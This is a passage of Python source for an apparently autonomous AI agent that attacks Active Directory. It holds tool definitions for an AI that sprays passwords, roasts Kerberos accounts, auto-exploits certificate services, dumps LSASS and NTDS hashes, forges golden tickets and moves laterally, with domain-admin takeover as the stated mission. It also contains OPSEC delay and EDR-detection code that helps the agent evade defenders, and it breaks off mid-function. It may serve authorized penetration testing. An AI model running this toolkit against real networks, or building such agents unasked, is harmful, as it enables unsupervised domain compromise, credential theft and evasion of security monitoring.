SYSTEM_PROMPT = _build_full_system_prompt()

# ══════════════════════════════════════════════════════════════════════════════
#  TOOL DEFINITIONS
# ══════════════════════════════════════════════════════════════════════════════

TOOLS = [
    {
        "name": "nmap_scan",
        "description": "Run nmap against the DC to discover open ports, OS, domain name, clock skew. Use as first step.",
        "input_schema": {
            "type": "object",
            "properties": {
                "target_ip": {"type": "string", "description": "DC IP address"}
            },
            "required": ["target_ip"]
        }
    },
    {
        "name": "enumerate_ldap",
        "description": "Full LDAP enumeration: users (with UAC flags), groups, computers, GPOs, trusts, delegations, SPNs, LAPS, password policy.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "target_ip":{"type": "string", "description": "Specific host with confirmed WinRM access"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string", "description": "NTLM hash (if no password)"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "enumerate_shares",
        "description": "Enumerate all SMB shares and their permissions. Download readable shares and search for credentials, config files, scripts.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "collect_bloodhound",
        "description": "Collect BloodHound data with bloodhound-python. Import the resulting zip into BloodHound/Neo4j, then query paths with query_bloodhound_paths.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string"},
                "use_kerberos": {"type": "boolean", "default": False}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "query_bloodhound_paths",
        "description": "Query imported BloodHound Neo4j data for shortest paths and actionable ACL edges from the owned user.",
        "input_schema": {
            "type": "object",
            "properties": {
                "domain": {"type": "string"},
                "owned_user": {"type": "string", "description": "Owned user account (e.g. jsmith or jsmith@corp.local)"},
                "neo4j_uri": {"type": "string", "default": "bolt://localhost:7687"},
                "neo4j_user": {"type": "string", "default": "neo4j"},
                "neo4j_password": {"type": "string", "description": "Neo4j password; can also use NEO4J_PASSWORD env var"}
            },
            "required": ["domain", "owned_user"]
        }
    },
    {
        "name": "asrep_roast",
        "description": "Find and roast accounts without Kerberos pre-authentication (AS-REP Roasting). Returns hashes to crack.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":     {"type": "string"},
                "domain":    {"type": "string"},
                "username":  {"type": "string", "description": "Optional: authenticated user for enum"},
                "password":  {"type": "string"},
                "userlist":  {"type": "string", "description": "Optional path to userlist file"}
            },
            "required": ["dc_ip", "domain"]
        }
    },
    {
        "name": "kerberoast",
        "description": "Kerberoast all SPN accounts. Returns TGS hashes. Automatically tries to crack with rockyou.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "password_spray",
        "description": "Spray a password or password list against all domain users. Respects lockout policy.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":      {"type": "string"},
                "domain":     {"type": "string"},
                "password":   {"type": "string", "description": "Password to spray"},
                "userlist":   {"type": "string", "description": "Path to userlist or 'auto' to use enumerated users"},
                "passwords":  {"type": "array", "items": {"type": "string"}, "description": "Multiple passwords to try"}
            },
            "required": ["dc_ip", "domain"]
        }
    },
    {
        "name": "adcs_scan",
        "description": "Scan for ADCS (certificate) vulnerabilities: ESC1-ESC13. If vulnerable, auto-exploit the highest severity ESC.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string"},
                "auto_exploit": {"type": "boolean", "default": True}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "shadow_credentials_attack",
        "description": "Perform Shadow Credentials attack on a target account (needs GenericWrite). Returns NT hash via PKINIT.",
        "input_schema": {
            "type": "object",
            "properties": {
                "attacker_user":   {"type": "string"},
                "attacker_pass":   {"type": "string"},
                "target_account":  {"type": "string", "description": "Target computer/gMSA account"},
                "dc_ip":           {"type": "string"},
                "domain":          {"type": "string"}
            },
            "required": ["attacker_user", "attacker_pass", "target_account", "dc_ip", "domain"]
        }
    },
    {
        "name": "acl_abuse_scan",
        "description": "Enumerate ACL rights the current user has over other AD objects. Look for GenericAll, WriteDACL, ForceChangePassword, etc.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "target":   {"type": "string", "description": "Specific target DN or 'all'"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "force_change_password_pivot",
        "description": (
            "Exploit a ForceChangePassword edge against an admin-capable account by resetting "
            "its password, validating the new credential, and storing it for immediate shell pivot."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":       {"type": "string"},
                "domain":      {"type": "string"},
                "username":    {"type": "string"},
                "password":    {"type": "string"},
                "nt_hash":     {"type": "string"},
                "target_user": {"type": "string", "description": "Admin or high-value account with ForceChangePassword edge"},
                "new_password": {"type": "string", "description": "Optional replacement password"}
            },
            "required": ["dc_ip", "domain", "username", "target_user"]
        }
    },
    {
        "name": "logon_script_abuse",
        "description": (
            "Use GenericWrite/WriteProperty on a user plus SYSVOL scripts access to set the "
            "user's scriptPath logon script. With script_content, uploads the script first; "
            "otherwise returns the exact exploitation plan."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":       {"type": "string"},
                "domain":      {"type": "string"},
                "username":    {"type": "string"},
                "password":    {"type": "string"},
                "nt_hash":     {"type": "string"},
                "target_user": {"type": "string", "description": "Writable target user"},
                "script_name": {"type": "string", "description": "Logon script filename"},
                "script_content": {"type": "string", "description": "Optional .bat content to upload into SYSVOL scripts"}
            },
            "required": ["dc_ip", "domain", "username", "target_user"]
        }
    },
    {
        "name": "auto_loot_chain",
        "description": "Run the full automated chain: enumerate shares → find credentials in log/config files → test with clock-skew bypass → find ACL paths → Shadow Credentials → NT hash → WinRM. Best for full automation.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username", "password"]
        }
    },
    {
        "name": "dcsync_attack",
        "description": "Run DCSync to dump all domain hashes (requires DA or Replication rights). Returns NTLM hashes for all accounts.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":      {"type": "string"},
                "domain":     {"type": "string"},
                "username":   {"type": "string"},
                "password":   {"type": "string"},
                "nt_hash":    {"type": "string"},
                "target_user":{"type": "string", "description": "Specific user or 'all'", "default": "all"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "lateral_movement",
        "description": (
            "Execute commands on a remote Windows target via WinRM (nxc -x), PSExec, or WMIExec. "
            "Fully Kerberos-aware — uses ccache when NTLM is disabled. "
            "ALWAYS call this after evil_winrm confirms access to run context collection: "
            "whoami, hostname, ipconfig, PS history. "
            "Use dc_ip OR target_ip (aliased automatically)."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target_ip":  {"type": "string", "description": "Target host IP or FQDN"},
                "domain":     {"type": "string"},
                "username":   {"type": "string"},
                "password":   {"type": "string"},
                "nt_hash":    {"type": "string"},
                "command":    {"type": "string",
                               "description": "Windows command to run for post-exploitation context (whoami, hostname, netstat, etc.)",
                               "default": "whoami /all & dir C:\\Users\\"},
                "method":     {"type": "string",
                               "enum": ["winrm", "psexec", "wmiexec"],
                               "default": "winrm"}
            },
            "required": ["target_ip", "domain", "username"]
        }
    },
    {
        "name": "windows_privesc_recon",
        "description": (
            "Run post-WinRM Windows privilege-escalation reconnaissance on the confirmed host. "
            "Looks for service-account context, local groups/privileges, writable application "
            "update paths, scheduled tasks running as other users, ADCS templates, and WSUS "
            "client/server configuration. Use after shell access, especially for gMSA or "
            "non-admin Remote Management Users access."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "target_ip": {"type": "string", "description": "Confirmed WinRM host"},
                "dc_ip":     {"type": "string"},
                "domain":    {"type": "string"},
                "username":  {"type": "string"},
                "password":  {"type": "string"},
                "nt_hash":   {"type": "string"}
            },
            "required": ["target_ip", "domain", "username"]
        }
    },
    {
        "name": "credential_loot",
        "description": (
            "Post-exploitation sensitive data collector. Hunts for cleartext credentials in "
            "web configs, app configs, DB connection strings, SSH keys, browser credential stores, "
            "GPP passwords, and sysprep/unattend files. Run after WinRM shell access is confirmed."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "test_credential",
        "description": "Test a credential (password or NT hash) against SMB, WinRM, and LDAP. Returns which protocols accept it and privilege level.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "discover_winrm_access",
        "description": (
            "Discover which hosts accept the current credential over WinRM before attempting "
            "an interactive shell. Tests the DC, any known hosts, and a scoped subnet when "
            "available. Use this after obtaining a password, NT hash, gMSA hash, or Kerberos "
            "ticket so the agent does not assume shell access is on the DC only."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":         {"type": "string"},
                "domain":        {"type": "string"},
                "username":      {"type": "string"},
                "password":      {"type": "string"},
                "nt_hash":       {"type": "string"},
                "target_subnet": {"type": "string", "description": "Optional CIDR scope such as 10.10.11.0/24"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "update_session",
        "description": "Update the session with newly discovered credentials, hashes, or owned machines.",
        "input_schema": {
            "type": "object",
            "properties": {
                "username":     {"type": "string"},
                "password":     {"type": "string"},
                "nt_hash":      {"type": "string"},
                "owned_users":  {"type": "array", "items": {"type": "string"}},
                "owned_machines": {"type": "array", "items": {"type": "string"}},
                "notes":        {"type": "string"}
            }
        }
    },
    {
        "name": "run_module",
        "description": "Run any specific AdAgent module by number for advanced operations not covered by other tools.",
        "input_schema": {
            "type": "object",
            "properties": {
                "module_num": {"type": "string", "description": "Module number (e.g. '19' for ADCS, '14' for Kerberos)"},
                "description": {"type": "string", "description": "What you want to do with this module"}
            },
            "required": ["module_num"]
        }
    },
    {
        "name": "generate_report",
        "description": "Generate a full pentest report from all collected findings in HTML, Markdown, and JSON formats.",
        "input_schema": {
            "type": "object",
            "properties": {
                "engagement_name": {"type": "string"},
                "summary":         {"type": "string", "description": "Executive summary of the engagement"}
            }
        }
    },
    {
        "name": "chain_planner",
        "description": (
            "Generate ranked AD attack chains from all collected intel and BloodHound JSON. "
            "Use before agent_complete or when stuck; returns copy-paste commands with current target values."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"},
                "domain": {"type": "string"}
            }
        }
    },
    {
        "name": "bloodyad",
        "description": (
            "Run bloodyAD for AD object manipulation: change group scope, add/remove members, "
            "write RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity), set object attributes, "
            "reset passwords. Essential for GenericWrite/GenericAll/WriteDACL abuse and "
            "cross-domain group manipulation (foreign SID injection)."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":     {"type": "string"},
                "domain":    {"type": "string"},
                "username":  {"type": "string"},
                "password":  {"type": "string"},
                "nt_hash":   {"type": "string"},
                "action":    {"type": "string", "description":
                              "bloodyAD action e.g. 'get object', 'set object', 'add groupMember', "
                              "'add rbcd', 'set password'"},
                "target":    {"type": "string", "description": "Target DN or object name"},
                "attribute": {"type": "string", "description": "Attribute to read/write e.g. groupType, msDS-AllowedToActOnBehalfOfOtherIdentity"},
                "value":     {"type": "string", "description": "Value to set"}
            },
            "required": ["dc_ip", "domain", "username", "action"]
        }
    },
    {
        "name": "gmsa_read",
        "description": (
            "Read gMSA (Group Managed Service Account) password hashes via nxc ldap --gmsa "
            "and bloodyAD. Works cross-domain. Returns NT hash for Pass-the-Hash lateral movement. "
            "Use after obtaining ReadGMSAPassword ACL membership."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "gmsa_takeover",
        "description": (
            "Full gMSA hijack chain when current principal has GenericWrite/GenericAll/WriteDACL/"
            "WriteOwner/WriteProperty on a gMSA ($) account. Resolves attacker SID, writes "
            "msDS-GroupMSAMembership SDDL to grant read access, then dumps the password blob and "
            "derives the NT hash. Stashes the hash in session loot for immediate Pass-the-Hash. "
            "Use this — NOT gmsa_read — when ACL evidence shows write rights on a $-account."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":        {"type": "string"},
                "domain":       {"type": "string"},
                "username":     {"type": "string"},
                "password":     {"type": "string"},
                "nt_hash":      {"type": "string"},
                "target_gmsa":  {"type": "string", "description": "gMSA sAMAccountName ending with $ (auto-discovered from acl_paths if omitted)"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "jea_enum",
        "description": (
            "Enumerate JEA (Just Enough Administration) endpoints and steal PowerShell history. "
            "Reads PSReadLine ConsoleHost_history.txt from service accounts via SMB. "
            "Critical after gaining gMSA or service account access — history often contains "
            "plaintext credentials or lateral movement commands."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "targeted_kerberoast",
        "description": (
            "Targeted Kerberoasting — add a fake SPN to a target account (requires GenericWrite "
            "or WriteSPN), request and capture its TGS hash, then remove the SPN. "
            "Converts any GenericWrite-abusable account (including DAs) into a crackable hash. "
            "Use after BloodHound reveals GenericWrite on a high-value account."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":       {"type": "string"},
                "domain":      {"type": "string"},
                "username":    {"type": "string"},
                "target_user": {"type": "string", "description": "Account to target (needs GenericWrite)"},
                "password":    {"type": "string"},
                "nt_hash":     {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username", "target_user"]
        }
    },
    {
        "name": "request_tgt",
        "description": (
            "Request a Kerberos TGT for the current user. MUST be called first when NTLM is "
            "disabled (nxc returns STATUS_NOT_SUPPORTED or LDAP returns Strong authentication "
            "required). Generates krb5.conf with the target IP as KDC, attempts to update "
            "/etc/krb5.conf, adds DC to /etc/hosts, requests TGT via getTGT.py, "
            "sets KRB5CCNAME and enables Kerberos mode for all subsequent tools."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "evil_winrm",
        "description": (
            "Attempt WinRM shell access via evil-winrm. Supports password, NT hash, and Kerberos "
            "(call request_tgt first for Kerberos mode). Returns connection command and confirms "
            "whether shell access is possible. Use after obtaining valid credentials or TGT."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "username": {"type": "string"},
                "password": {"type": "string"},
                "nt_hash":  {"type": "string"},
                "command":  {"type": "string", "description": "Test command to run", "default": "whoami /all"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "kerbrute_enum",
        "description": (
            "Enumerate valid AD users via Kerberos (port 88) — NO credentials or NTLM required. "
            "Works against NTLM-disabled DCs. Returns valid usernames for AS-REP roasting. "
            "Use when you have no credentials or when NTLM auth is blocked."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":    {"type": "string"},
                "domain":   {"type": "string"},
                "wordlist": {"type": "string", "description": "Path to usernames wordlist"},
                "threads":  {"type": "string", "default": "50"}
            },
            "required": ["dc_ip", "domain"]
        }
    },
    {
        "name": "no_cred_surface_recon",
        "description": (
            "No-credential external AD surface reconnaissance. Checks SMB null/guest exposure, "
            "HTTP/HTTPS apps including ADCS /certsrv, WSUS ports, MSSQL exposure, and LDAP RootDSE "
            "without requiring a username or password."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip":  {"type": "string"},
                "domain": {"type": "string"}
            },
            "required": ["dc_ip", "domain"]
        }
    },
    {
        "name": "agent_complete",
        "description": "Signal that the agent has completed its mission. Call this when DA is achieved or all paths are exhausted.",
        "input_schema": {
            "type": "object",
            "properties": {
                "status":  {"type": "string", "enum": ["da_achieved", "partial", "failed"], "description": "Mission outcome"},
                "summary": {"type": "string", "description": "Final summary of what was accomplished"}
            },
            "required": ["status", "summary"]
        }
    },
    {
        "name": "rbcd_attack",
        "description": "Resource-Based Constrained Delegation full chain. Requires GenericWrite on a computer object. Creates attacker computer, sets RBCD, then S4U2Proxy to impersonate Administrator.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"},
                "nt_hash": {"type": "string"},
                "target_computer": {"type": "string", "description": "Target computer SAMAccountName (e.g. WS01$) where attacker has GenericWrite"}
            },
            "required": ["dc_ip", "domain", "username", "target_computer"]
        }
    },
    {
        "name": "coercion_attack",
        "description": "Force DC/server to authenticate to attacker via PetitPotam/PrinterBug/Coercer. Captures Net-NTLMv2 or relays to LDAP for Shadow Credentials. Start Responder or ntlmrelayx FIRST.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"},
                "attacker_ip": {"type": "string", "description": "Your listener IP"},
                "method": {"type": "string", "enum": ["auto", "petitpotam", "printerbug", "coercer", "dfscoerce"], "description": "Coercion method"}
            },
            "required": ["dc_ip", "domain", "username", "attacker_ip"]
        }
    },
    {
        "name": "unconstrained_delegation",
        "description": "Find computers with TrustedForDelegation=True. When such a host is compromised, coerce DC auth to capture DC$ TGT, then DCSync.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"},
                "nt_hash": {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "pre2k_attack",
        "description": "Pre-Windows 2000 computer account attack. Accounts created with pre-Win2K compatible access use lowercase computer name as password. Unauthenticated enumeration possible.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"}
            },
            "required": ["dc_ip", "domain"]
        }
    },
    {
        "name": "timeroast",
        "description": "Timeroasting: capture NTP response hashes for computer accounts (unauthenticated). Crack with hashcat -m 31300. Works against all Windows DCs.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"}
            },
            "required": ["dc_ip", "domain"]
        }
    },
    {
        "name": "credential_dump",
        "description": "Dump credentials from an owned host: LSASS via lsassy/nanodump, SAM+LSA secrets, full secretsdump, NTDS DCSync. Run after shell access confirmed.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"},
                "nt_hash": {"type": "string"},
                "target_ip": {"type": "string", "description": "IP of host to dump (default: DC)"},
                "method": {"type": "string", "enum": ["auto", "lsassy", "secretsdump", "nanodump", "sam"]}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "laps_read",
        "description": "Read LAPS local administrator passwords from Active Directory (ms-Mcs-AdmPwd / msLAPS-Password). Requires ReadLAPSPassword permission.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"},
                "nt_hash": {"type": "string"},
                "target_computer": {"type": "string", "description": "Specific computer to read LAPS for (blank = all)"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "mssql_abuse",
        "description": "MSSQL abuse: enumerate instances, enable and run xp_cmdshell, capture NTLM hash via xp_dirtree, enumerate linked servers. Run when port 1433 or MSSQLSvc SPN detected.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"},
                "nt_hash": {"type": "string"},
                "target_ip": {"type": "string", "description": "IP of MSSQL server (default: DC IP)"},
                "command": {"type": "string", "description": "OS command to run via xp_cmdshell"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "shadow_copies_dump",
        "description": "Dump NTDS.dit via Volume Shadow Copies / diskshadow. Alternative to DCSync when direct replication is blocked.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"}, "nt_hash": {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "golden_ticket",
        "description": "Forge a Golden Ticket using the krbtgt NT hash (obtained from dcsync_attack). Provides unlimited domain persistence — valid for any user.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string", "description": "User to impersonate (default: Administrator)"},
                "krbtgt_hash": {"type": "string", "description": "NT hash of krbtgt account"},
                "domain_sid": {"type": "string", "description": "Domain SID (S-1-5-21-...)"}
            },
            "required": ["dc_ip", "domain"]
        }
    },
    {
        "name": "silver_ticket",
        "description": "Forge a Silver Ticket for a specific service using the service account NT hash. No KDC contact needed — completely offline.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "service": {"type": "string", "description": "Service type: cifs, http, host, ldap"},
                "target_computer": {"type": "string"}, "service_hash": {"type": "string"},
                "domain_sid": {"type": "string"}
            },
            "required": ["dc_ip", "domain", "service_hash"]
        }
    },
    {
        "name": "trust_attack",
        "description": "Cross-domain/forest trust attacks: enumerate trusts, child-to-parent escalation via ExtraSID, cross-forest Kerberoasting.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"}, "nt_hash": {"type": "string"},
                "attack": {"type": "string", "enum": ["enumerate", "child_to_parent", "extraSID", "cross_forest_kerberoast"]}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "user_hunt",
        "description": "Find where privileged users are logged on and where you have local admin access across domain machines. Essential for lateral movement planning.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"}, "nt_hash": {"type": "string"},
                "target_user": {"type": "string", "description": "Specific user to hunt (e.g. Administrator)"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "gpo_abuse",
        "description": "GPO abuse: enumerate writable GPOs, create malicious scheduled task, add local admin via restricted groups.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"}, "nt_hash": {"type": "string"},
                "action": {"type": "string", "enum": ["enumerate", "create_task", "add_local_admin", "list_linked"]},
                "command": {"type": "string", "description": "Command to execute via GPO task"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "sccm_abuse",
        "description": "SCCM/MECM abuse: discover SCCM servers, extract NAA credentials, enumerate collections, check for client push and site takeover paths.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"}, "nt_hash": {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "adidns_abuse",
        "description": "ADIDNS abuse: enumerate DNS zones, inject wildcard record for WPAD/LLMNR poisoning, add A records for hash capture.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"}, "nt_hash": {"type": "string"},
                "action": {"type": "string", "enum": ["enumerate", "add_wildcard", "add_record", "remove_record"]},
                "record_name": {"type": "string"}, "record_ip": {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "pass_the_cert",
        "description": "PassTheCert / UnPAC-the-Hash: authenticate with a PFX certificate to get the NT hash via PKINIT or LDAP Schannel. Use after shadow_credentials_attack or ADCS exploitation.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"},
                "pfx_file": {"type": "string", "description": "Path to PFX certificate file"},
                "pfx_pass": {"type": "string", "description": "PFX password if encrypted"},
                "target_user": {"type": "string", "description": "User the cert was issued for"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
    {
        "name": "rodc_attack",
        "description": "RODC attacks: enumerate Read-Only DCs, check cached credentials, password replication policy, and key list attack guidance.",
        "input_schema": {
            "type": "object",
            "properties": {
                "dc_ip": {"type": "string"}, "domain": {"type": "string"},
                "username": {"type": "string"}, "password": {"type": "string"}, "nt_hash": {"type": "string"}
            },
            "required": ["dc_ip", "domain", "username"]
        }
    },
]


# ══════════════════════════════════════════════════════════════════════════════
#  TOOL IMPLEMENTATION FUNCTIONS
# ══════════════════════════════════════════════════════════════════════════════

def _opsec_sleep(base_seconds: float = 1.0) -> None:
    """Jitter-based sleep for OPSEC. In stealth mode uses longer delays."""
    if OPSEC_MODE == "loud":
        return
    import random
    if OPSEC_MODE == "stealth":
        delay = base_seconds * random.uniform(3.0, 8.0)
    else:  # normal
        delay = base_seconds * random.uniform(0.5, 2.0)
    time.sleep(delay)


def _check_edr(target_ip: str, domain: str, username: str,
               password: str = "", nt_hash: str = "") -> dict:
    """Detect EDR/AV on owned hosts via WMI/WinRM. Returns dict of findings.
    Used to decide whether to use native tools or offensive tooling."""
    auth = _auth_args_nxc(username, password, nt_hash, domain, target_ip)
    edr_info = {"edr": [], "av": [], "defender": False, "mdi": False, "raw": ""}

    edr_cmd = (
        "powershell -c \""
        "Get-Process | Where-Object {$_.Name -match "
        "'crowdstrike|sentinelone|cylance|carbon.black|defender|mde|"
        "csfalcon|csagent|mssense|mdatp|eset|kaspersky|symantec|mcafee|"
        "sophos|bitdefender|webroot|trend'} | "
        "Select-Object Name | Format-List\""
    )
    out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(edr_cmd)}", timeout=20)
    edr_info["raw"] = out[:500]

    low = out.lower()
    if any(s in low for s in ("crowdstrike", "csfalcon", "csagent")):
        edr_info["edr"].append("CrowdStrike Falcon")
    if any(s in low for s in ("sentinelone", "sentinelagent")):
        edr_info["edr"].append("SentinelOne")
    if any(s in low for s in ("cylance",)):
        edr_info["edr"].append("Cylance")
    if any(s in low for s in ("carbon black", "cbdefense", "repmgr")):
        edr_info["edr"].append("Carbon Black")
    if any(s in low for s in ("mssense", "mdatp", "mde ")):
        edr_info["edr"].append("Microsoft Defender for Endpoint")
        edr_info["defender"] = True
    if "msdefend" in low or "windefend" in low:
        edr_info["av"].append("Windows Defender AV")
        edr_info["defender"] = True

    # Check MDI (Azure ATP sensor)
    mdi_cmd = "powershell -c \"Get-Service -Name 'AATPSensor','AATP*' -ErrorAction SilentlyContinue | Select-Object Name,Status\""
    mdi_out = _nxc(f"winrm {target_ip} {auth} -x {shell_quote(mdi_cmd)}", timeout=15)
    if "running" in mdi_out.lower():
        edr_info["mdi"] = True
        edr_info["edr"].append("Microsoft Defender for Identity (MDI)")

    if edr_info["edr"] or edr_info["av"]:
        add_finding("EDR/AV Detected", "Medium",
                    f"Security products on {target_ip}: {edr_info['edr'] + edr_info['av']}",
                    "Use native LOLBins; avoid dropping known-bad tools; consider C2 beacon instead")
        SESSION.setdefault("agent_intel", {})["edr_detected"] = edr_info["edr"]
        SESSION.setdefault("agent_intel", {})["defender"] = edr_info["defender"]
        SESSION.setdefault("agent_intel", {})["mdi"] = edr_info["mdi"]

    return edr_info


def _check_lockout_policy() -> dict:
    """Read the domain password policy before spraying.
    Returns threshold, observation_window, and safe spray count."""
    policy = SESSION.get("agent_intel", {}).get("lockout_policy", {})
    if policy:
        return policy  # already fetched this session

    dc_ip  = SESSION.get("dc_ip", "")
    domain = SESSION.get("domain", "")
    u      = SESSION.get("username", "")
    p      = _real_secret(SESSION.get("password", ""))
    h      = _real_nt_hash(SESSION.get("nt_hash", ""))
    auth   = _auth_args_nxc(u, p, h, domain, dc_ip)

    out = _nxc(f"ldap {dc_ip} {auth} --pass-pol", timeout=20)
    policy = {"threshold": 0, "observation_window": 30, "safe_count": 1, "raw": out[:500]}

    m = re.search(r"Account Lockout Threshold:\s*(\d+)", out, re.I)
    if m:
